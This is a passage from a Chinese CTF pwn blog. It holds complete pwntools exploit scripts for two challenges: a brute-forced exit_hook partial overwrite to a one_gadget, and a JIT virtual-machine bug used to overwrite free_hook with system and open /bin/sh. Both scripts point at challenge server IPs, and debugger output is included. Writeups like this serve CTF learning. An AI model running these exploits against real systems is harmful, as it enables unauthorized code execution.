<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(sizea);</span><br></pre></td></tr></table></figure>
<p>计算偏移使得 data 指向 exit_hook</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( c.key == <span class="string">&#x27;@&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  data += *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;code[c.index + <span class="number">1</span>];</span><br><span class="line">  c.index += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用局部写漏洞覆盖 exit_hook 低位为 one_gadget，爆破3位出 flag（概率为 1/4096）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./main1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">local = 0</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">    p = process(challenge)</span></span><br><span class="line"><span class="string">    #p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;1.13.101.243&#x27;,&#x27;25752&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x12DA)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    backdoor_addr = <span class="number">0x1209</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    sla(<span class="string">&quot;data size&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100000</span>))</span><br><span class="line">    sla(<span class="string">&quot;code size&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>)) <span class="comment"># 0x7ffff7eb8afe</span></span><br><span class="line">    payload = <span class="string">&quot;@&quot;</span>+p32(<span class="number">0x323f58</span>)+<span class="string">&quot;.&quot;</span>+p8(<span class="number">0xfe</span>)+<span class="string">&quot;&gt;.&quot;</span>+p8(<span class="number">0x7a</span>)+<span class="string">&quot;&gt;.&quot;</span>+p8(<span class="number">0xa6</span>)+<span class="string">&quot;q&quot;</span></span><br><span class="line">    sla(<span class="string">&quot;your code&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        p = remote(<span class="string">&#x27;1.13.101.243&#x27;</span>,<span class="string">&#x27;25752&#x27;</span>)</span><br><span class="line">        <span class="comment">#p = process(challenge)</span></span><br><span class="line">        pwn()</span><br><span class="line">        sl(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">        flag = ru(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jit"><a href="#jit" class="headerlink" title="jit"></a>jit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jit: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">7062b</span>1b0edff968d09e012e0905c2e5b7276cbd4, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped       </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>程序分析</strong></p>
<p>本题目实现了一个虚拟机，在地址为 0x4240 的地方开始加载字节码 ，支持4种内置的函数调用，大致格式如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[opcode][原寄存器的值][目标寄存器的值][data len][data]</span><br><span class="line">[<span class="number">0</span>---<span class="number">-7</span>][<span class="number">8</span>-------<span class="number">-11</span>][<span class="number">12</span>--------<span class="number">-15</span>][<span class="number">16</span>---<span class="number">-31</span>][<span class="number">32</span><span class="number">-63</span>]</span><br></pre></td></tr></table></figure>
<p>程序在 0x31B0 的代码会对之前部署的字节码进行解析，并将其转化为 x86 能理解的二进制代码并写入一片由 mmap 申请的内存空间</p>
<p>下面就是 mov 指令的实现：（包括直接寻址和间接寻址）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xB7</span>:</span><br><span class="line">  ++reg_pc;</span><br><span class="line">  *(&amp;reg + (<span class="keyword">unsigned</span> __int8)reg_op1) = val;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xBF</span>:</span><br><span class="line">  ++reg_pc;</span><br><span class="line">  *(&amp;reg + (<span class="keyword">unsigned</span> __int8)reg_op1) = *(&amp;reg + (<span class="keyword">unsigned</span> __int8)reg_op2);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
<p>经过调试测试，各个寄存器对应的数值如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>reg</th>
<th>num</th>
</tr>
</thead>
<tbody>
<tr>
<td>rax</td>
<td>0</td>
</tr>
<tr>
<td>rdi</td>
<td>1</td>
</tr>
<tr>
<td>rsi</td>
<td>2</td>
</tr>
<tr>
<td>rdx</td>
<td>3</td>
</tr>
<tr>
<td>r9</td>
<td>4</td>
</tr>
<tr>
<td>r8</td>
<td>5</td>
</tr>
<tr>
<td>rbx</td>
<td>6</td>
</tr>
<tr>
<td>r13</td>
<td>7</td>
</tr>
<tr>
<td>r14</td>
<td>8</td>
</tr>
<tr>
<td>r15</td>
<td>9</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>PS：使用 opcode 决定该寄存器的占位大小（byte，word，dword，qword）</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目完全是依靠程序本身的功能进行入侵</p>
<p>可以构建合适的汇编代码来获取 <code>[rdi+0x58]</code> 处的 libc 地址，计算偏移将其改为 system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">opcode,reg_op2,reg_op1,data1,data2</span>):</span></span><br><span class="line">    payload =  p8(opcode)</span><br><span class="line">    payload += p8((reg_op2&lt;&lt;<span class="number">4</span>) | reg_op1)</span><br><span class="line">    payload += p16(data1)</span><br><span class="line">    payload += p32(data2)</span><br><span class="line">    payload = binascii.hexlify(payload.encode())</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_reg</span>(<span class="params">reg_op1,reg_op2,offset</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x79</span>,reg_op2,reg_op1,offset,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_data</span>(<span class="params">reg_op1,data</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x17</span>,<span class="number">0</span>,reg_op1,<span class="number">0</span>,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">key</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x85</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,key)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  load_reg(regs().r15, regs().rdi, <span class="number">0x58</span>)</span><br><span class="line">payload += sub_data(regs().r15, <span class="number">0x4346e0</span>-<span class="number">0x80</span>) </span><br><span class="line">payload += add_data(regs().r15, <span class="number">0x52290</span>-<span class="number">0x80</span>) </span><br></pre></td></tr></table></figure>
<p>经调试发现，程序的“内置函数”就记录在 heap 中</p>
<p>比赛时的入侵思路就是往“内置函数”中写入 system（程序通过 offset 来决定具体调用哪个“内置函数”，但并没有对 offset 进行限制）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│  <span class="number">0x55e26ce6ba58</span> ◂— <span class="number">0x211</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│  <span class="number">0x55e26ce6ba60</span> —▸ <span class="number">0x55e26c5ca710</span> ◂— endbr64 </span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│  <span class="number">0x55e26ce6ba68</span> —▸ <span class="number">0x55e26c5ca750</span> ◂— endbr64 </span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│  <span class="number">0x55e26ce6ba70</span> —▸ <span class="number">0x55e26c5ca770</span> ◂— endbr64 </span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│  <span class="number">0x55e26ce6ba78</span> —▸ <span class="number">0x55e26c5ca7b0</span> ◂— endbr64 </span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>│  <span class="number">0x55e26ce6ba80</span> —▸ <span class="number">0x55e26c5ca790</span> ◂— endbr64 </span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│  <span class="number">0x55e26ce6ba88</span> —▸ <span class="number">0x55e26c5ca780</span> ◂— endbr64 </span><br></pre></td></tr></table></figure>
<p>最后发现写入的 system 不起作用，不管是添加到 func_list 后还是覆盖已有的值都没用</p>
<p>可能是 func_list 的位置没有找对，因为在 search 时发现多个地址都存在 func_list：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x55c891fd0710</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>\x10\x07\xfd\x91\xc8U\x00\x00<span class="number">&#x27;</span></span><br><span class="line">[heap]          <span class="number">0x55c892d062d8</span> <span class="number">0x55c891fd0710</span></span><br><span class="line">[heap]          <span class="number">0x55c892d07b00</span> <span class="number">0x55c891fd0710</span></span><br><span class="line">[heap]          <span class="number">0x55c892d07f50</span> <span class="number">0x55c891fd0710</span></span><br><span class="line">[anon_7fc3e8f18] <span class="number">0x7fc3e8f18030</span> adc    byte ptr [rdi], al</span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fff31949158</span> <span class="number">0x55c891fd0710</span></span><br></pre></td></tr></table></figure>
<p>可以选择去挨个覆盖这些地址，也可以直接去覆盖 free_hook，这里采用了后者</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./jit1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x886B)\nb *$rebase(0x85F5)\nb *$rebase(0x4476)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">regs</span>():</span></span><br><span class="line">    rax = <span class="number">0</span></span><br><span class="line">    rdi = <span class="number">1</span></span><br><span class="line">    rsi = <span class="number">2</span></span><br><span class="line">    rdx = <span class="number">3</span></span><br><span class="line">    r9  = <span class="number">4</span></span><br><span class="line">    r8  = <span class="number">5</span></span><br><span class="line">    rbx = <span class="number">6</span></span><br><span class="line">    r13 = <span class="number">7</span></span><br><span class="line">    r14 = <span class="number">8</span></span><br><span class="line">    r15 = <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">opcode,reg_op2,reg_op1,data1,data2</span>):</span></span><br><span class="line">    payload =  p8(opcode)</span><br><span class="line">    payload += p8((reg_op2&lt;&lt;<span class="number">4</span>) | reg_op1)</span><br><span class="line">    payload += p16(data1)</span><br><span class="line">    payload += p32(data2)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    payload = binascii.hexlify(payload.encode())</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store_reg</span>(<span class="params">reg_op1,reg_op2,offset</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x7b</span>,reg_op2,reg_op1,offset,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store_data</span>(<span class="params">reg_op1,data,offset</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x7a</span>,<span class="number">0</span>,reg_op1,offset,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_reg</span>(<span class="params">reg_op1,reg_op2,offset</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x79</span>,reg_op2,reg_op1,offset,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov_reg</span>(<span class="params">reg_op1,reg_op2</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0xbf</span>,reg_op2,reg_op1,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov_data</span>(<span class="params">reg_op1,data</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0xb7</span>,<span class="number">0</span>,reg_op1,<span class="number">0</span>,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_data</span>(<span class="params">reg_op1,data</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x7</span>,<span class="number">0</span>,reg_op1,<span class="number">0</span>,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_data</span>(<span class="params">reg_op1,data</span>):</span></span><br><span class="line">    payload = cmd(<span class="number">0x17</span>,<span class="number">0</span>,reg_op1,<span class="number">0</span>,data)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span>():</span></span><br><span class="line">    <span class="comment">#payload = cmd(0x85,0,0,0,key)</span></span><br><span class="line">    payload = <span class="string">&quot;8500050000000000&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  load_reg(regs().r9, regs().rdi, <span class="number">0x38</span>)</span><br><span class="line">payload += sub_data(regs().r9, <span class="number">0x4346e0</span>-<span class="number">0x80</span>) </span><br><span class="line">payload += add_data(regs().r9, <span class="number">0x52290</span>-<span class="number">0x80</span>) </span><br><span class="line">payload += load_reg(regs().r8, regs().rdi, <span class="number">0x48</span>)</span><br><span class="line">payload += sub_data(regs().r8, <span class="number">0x41f060</span>-<span class="number">0xe048</span>) </span><br><span class="line">payload += add_data(regs().r8, <span class="number">0x1eee48</span>-<span class="number">0xe048</span>) </span><br><span class="line">payload += store_reg(regs().r8,regs().r9,<span class="number">0</span>)</span><br><span class="line">payload += store_data(regs().rdi,<span class="number">0x6873</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Program:&quot;</span>,payload)</span><br><span class="line">sla(<span class="string">&quot;Memory:&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/08/Principles%EF%BC%9Aflatbuffers%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/08/Principles%EF%BC%9Aflatbuffers%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Principles：flatbuffers逆向分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-08-08 21:40:52 / Modified: 21:42:30" itemprop="dateCreated datePublished" datetime="2023-08-08T21:40:52+08:00">2023-08-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
